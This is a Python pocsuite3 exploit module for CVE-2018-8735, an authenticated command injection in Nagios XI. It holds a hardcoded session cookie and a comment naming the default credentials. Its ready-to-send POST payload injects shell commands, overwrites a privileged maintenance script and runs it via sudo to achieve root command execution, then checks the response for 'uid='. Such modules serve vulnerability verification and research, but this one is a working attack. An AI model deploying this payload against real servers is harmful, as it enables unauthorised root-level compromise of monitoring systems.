#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
from pocsuite3.api import requests as req # 用法和 requests 完全相同
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase

# import requests
headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0', 'content-type': 'application/x-www-form-urlencoded'}
cookies={'nagiosxi':'02v52nubcq54b9l2kmu7irhp67'}  #需要更新，默认账号root/nagiosxi
poc_str = '''cmd=submitcommand&command=1111&command_data=$("cp /usr/local/nagiosxi/scripts/reset_config_perms.sh /usr/local/nagiosxi/scripts/reset_config_perms.sh.bak && echo "`id`" > /usr/local/nagiosxi/scripts/reset_config_perms.sh && sudo /usr/local/nagiosxi/scripts/reset_config_perms.sh && mv /usr/local/nagiosxi/scripts/reset_config_perms.sh.bak /usr/local/nagiosxi/scripts/reset_config_perms.sh")'''


def poc(url):
    response=""
    url=str(url)[7:]
    url="http://"+url+"/nagiosxi/backend/index.php"
    try:
        res = req.post(url, data=poc_str, verify=False, timeout=5, headers=headers,cookies=cookies)
        response = res.text
    except Exception:
        response = ""
    return ("uid=" in response)


class TestPOC(POCBase):
    name = 'liunx_cve-2018-8735'
    vulID = 'CVE-2018-8735'
    author = ['weihong','mfz']
    vulType = 'RCE'
    version = '1.1'  # default version: 1.0
    references = ['']
    desc = '''
            这个命令注入漏洞主要是通过分析应用程序.php文件源代码而发现的。
            这对我们很有用，一则受它影响的NagiosXI版本范围广，二则它是以用户'nagiosxi'（而不是'apache'）的身份来运行的。
            我们终于找到了一个含有安全漏洞的POST请求，准确来说，它容易受到已经通过身份验证的命令注入攻击的影响。
		   '''
    vulDate = '2018-04-30'
    createDate = '2020-04-03'
    updateDate = '2020-12-03'
    appName = 'Liunx Nagios XI'
    appVersion = 'Liunx Nagios XI 5.2.x through 5.4.x before 5.4.13'
    appPowerLink = ''
    samples = ['']

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        aa = poc(self.url)
        if aa:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['IP'] = str(self.url)[7:] + ' Liunx_cve-2018-8735' + ' is exist!'
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register_poc(TestPOC)
